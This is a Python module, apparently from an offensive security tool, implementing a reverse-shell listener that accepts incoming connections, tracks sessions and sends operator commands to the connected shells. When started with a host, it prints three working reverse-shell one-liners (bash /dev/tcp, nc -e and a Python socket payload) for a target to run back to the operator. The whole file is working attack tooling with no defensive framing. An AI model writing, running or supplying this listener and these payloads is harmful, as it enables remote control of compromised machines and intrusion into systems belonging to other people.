import os
import sys
import socket
import threading
import time
from core.utils import colored


class Listener:
    def __init__(self):
        self.running = False
        self.thread = None
        self.port = None
        self.connections = []
        self.lock = threading.Lock()

    def start(self, port, lhost=None):
        self.port = port
        self.running = True
        self.thread = threading.Thread(target=self._listen, args=(port,), daemon=True)
        self.thread.start()
        print(colored(f"\n[+] Listener started on port {port}", "32"))
        print(colored(f"[*] Connect back with one of these:\n", "33"))
        if lhost:
            print(f"    bash -i >& /dev/tcp/{lhost}/{port} 0>&1")
            print(f"    nc -e /bin/sh {lhost} {port}")
            print(f"    python3 -c 'import socket,subprocess,os; s=socket.socket(); s.connect((\"{lhost}\",{port})); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"])'")
            print()
        print(colored(f"[*] Waiting for connections on 0.0.0.0:{port}...", "36"))
        print(colored(f"[*] Type /listen stop to stop listener", "33"))
        print()
        return True

    def _listen(self, port):
        try:
            server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            server.settimeout(1.0)
            server.bind(("0.0.0.0", port))
            server.listen(5)
            while self.running:
                try:
                    client, addr = server.accept()
                    with self.lock:
                        self.connections.append({"socket": client, "addr": addr})
                    print(colored(f"\n  [+] INCOMING CONNECTION from {addr[0]}:{addr[1]}", "32"))
                    print(colored(f"  [?] Type /listen interact {len(self.connections)-1} to interact", "33"))
                    print(colored(f"  [?] Type /listen sessions to list all", "33"))
                    print(colored(f"  omn> ", "31"), end="", flush=True)
                except socket.timeout:
                    continue
            server.close()
        except Exception as e:
            print(colored(f"\n[!] Listener error: {e}", "31"))
            self.running = False

    def stop(self):
        self.running = False
        for conn in self.connections:
            try:
                conn["socket"].close()
            except Exception:
                pass
        self.connections = []
        print(colored(f"[+] Listener on port {self.port} stopped", "33"))
        self.port = None

    def list_sessions(self):
        if not self.connections:
            print(colored("[!] No active sessions", "31"))
            return
        print(colored(f"\nActive sessions ({len(self.connections)}):", "36"))
        for i, conn in enumerate(self.connections):
            addr = conn["addr"]
            alive = self._is_alive(conn["socket"])
            status = colored("ALIVE", "32") if alive else colored("DEAD", "31")
            print(f"  [{i}] {addr[0]}:{addr[1]} - {status}")

    def _is_alive(self, sock):
        try:
            sock.send(b"\x00")
            return True
        except Exception:
            return False

    def interact(self, session_id):
        if session_id < 0 or session_id >= len(self.connections):
            print(colored(f"[!] Invalid session: {session_id}", "31"))
            return
        conn = self.connections[session_id]
        sock = conn["socket"]
        addr = conn["addr"]
        print(colored(f"\n[*] Interacting with {addr[0]}:{addr[1]}", "32"))
        print(colored("[*] Type commands, or 'exit' to go back\n", "33"))
        try:
            sock.settimeout(0.5)
            while True:
                cmd = input(colored(f"shell@{addr[0]}> ", "31")).strip()
                if cmd.lower() in ("exit", "quit", "back"):
                    break
                if not cmd:
                    continue
                try:
                    sock.send((cmd + "\n").encode())
                    time.sleep(0.3)
                    output = b""
                    while True:
                        try:
                            chunk = sock.recv(4096)
                            if not chunk:
                                break
                            output += chunk
                        except socket.timeout:
                            break
                    if output:
                        print(output.decode(errors="replace"))
                    else:
                        print(colored("[!] No output (command may need time)", "33"))
                except Exception as e:
                    print(colored(f"[!] Connection error: {e}", "31"))
                    break
        except KeyboardInterrupt:
            print()
        print(colored(f"[*] Returned to main session", "33"))


_listener = None


def run_listener(args):
    global _listener
    if _listener is None:
        _listener = Listener()

    args = args.strip()
    if args == "stop":
        if _listener and _listener.running:
            _listener.stop()
        else:
            print(colored("[!] No listener running", "31"))
        return

    if args == "sessions":
        if _listener:
            _listener.list_sessions()
        else:
            print(colored("[!] No listener running", "31"))
        return

    if args.startswith("interact "):
        sid = args[9:].strip()
        if sid.isdigit() and _listener:
            _listener.interact(int(sid))
        else:
            print(colored("[!] Usage: /listen interact <session_id>", "31"))
        return

    parts = args.split()
    port = parts[0] if parts else "4444"
    lhost = parts[1] if len(parts) > 1 else None
    if port.isdigit():
        if _listener and _listener.running:
            print(colored(f"[!] Listener already running on port {_listener.port}", "33"))
            print(colored("[*] Use /listen stop first", "33"))
            return
        _listener.start(int(port), lhost)
    else:
        print(colored("[!] Usage: /listen <port> [lhost]", "31"))
